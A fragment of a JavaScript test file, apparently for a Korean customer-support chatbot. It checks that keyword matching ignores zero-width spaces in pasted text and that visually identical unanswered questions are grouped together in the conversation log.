  assert.notEqual('환불\u{200b}정책'.normalize('NFC'), base, '재현이 깨졌다(NFC 가 이미 지운다)');

  // 엔진의 키워드 매칭도 같은 자를 지난다 — 붙여 넣은 문장에서 키워드를 찾는다.
  const p = N.prepare('환불\u{200b}정책이 궁금합니다');
  assert.equal(N.keywordHit(p.compact, p.jamo, '환불정책').kind, 'exact', '붙여 넣은 문장에서 키워드를 찾지 못한다');

  // 「답하지 못한 질문」 묶음 — 눈에 같은 두 질문이 한 줄로 선다.
  const conv = await importLib('convlog', CONVLOG_DEPS);
  conv.resetLogs();
  for (const message of ['환불 수수료 얼마인가요', '환불\u{200b} 수수료 얼마인가요?']) {
    conv.logTurn({ sessionId: 's-inv', message, reply: '안내드릴 수 없습니다', intent: 'unknown', source: 'fallback', escalate: false });
  }
  const un = conv.unansweredQuestions(8);
  assert.equal(un.groups, 1, '눈에 같은 질문을 두 줄로 센다');
  assert.equal(un.items[0].count, 2, '묶음 안의 건수가 맞지 않는다');
  conv.resetLogs();
});
